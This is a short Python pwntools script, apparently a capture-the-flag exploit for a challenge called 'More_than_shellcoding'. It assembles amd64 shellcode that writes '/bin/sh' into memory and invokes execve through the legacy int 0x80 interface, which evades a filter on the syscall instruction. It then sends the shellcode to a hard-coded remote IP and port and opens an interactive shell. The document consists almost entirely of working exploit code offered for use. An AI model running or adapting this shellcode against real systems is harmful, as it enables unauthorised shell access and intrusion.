#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

# /bin/sh = 0068732f6e69622f

# Having to use 32 bit addresses, so lets write to global
# variables (program text)
SHELLCODE = """
mov rax,0x0068732f6e69622f
mov rbx,0x404000
mov [rbx],rax

mov edi,ebx
mov rax,11

xor ecx,ecx
xor edx,edx

int 0x80

xor rax,rax
inc rax
int 0x80
"""


byte_code = asm(SHELLCODE)
if b"\x0f\x05" in byte_code:
    print("Shellcode contains forbidden instruction")

print("Generated shellcode ...")

do = True
if do:
    #p = process("./More_than_shellcoding")
    p = remote("35.228.15.118", 1338)
    p.readline()

    input("Continue?")
    p.sendline(byte_code)
    p.interactive()

print("Done")
